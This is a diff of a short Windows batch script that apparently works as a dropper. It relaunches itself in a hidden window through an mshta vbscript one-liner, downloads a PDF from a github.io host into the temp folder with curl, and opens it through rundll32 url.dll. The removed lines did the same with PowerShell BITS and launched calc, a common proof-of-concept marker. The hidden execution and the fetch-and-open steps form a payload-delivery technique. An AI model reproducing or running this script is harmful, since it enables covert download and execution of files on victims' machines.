@@ -1,3 +1,8 @@
 @echo off
-powershell.exe -c (Start-BitsTransfer -Source "https://sheng855174.github.io/pdf-test.pdf" -Destination "%temp%\pdf-test.pdf")
-rundll32 url.dll,FileProtocolHandler file:///%temp%/pdf-test.pdf && calc"
+
+if "%1" == "h" goto begin
+start mshta vbscript:createobject("wscript.shell").run("""%~0"" h",0)(window.close)&&exit
+:begin
+
+curl https://sheng855174.github.io/pdf-test.pdf -o "%temp%\pdf-test.pdf"
+rundll32 url.dll,FileProtocolHandler file:///%temp%/pdf-test.pdf
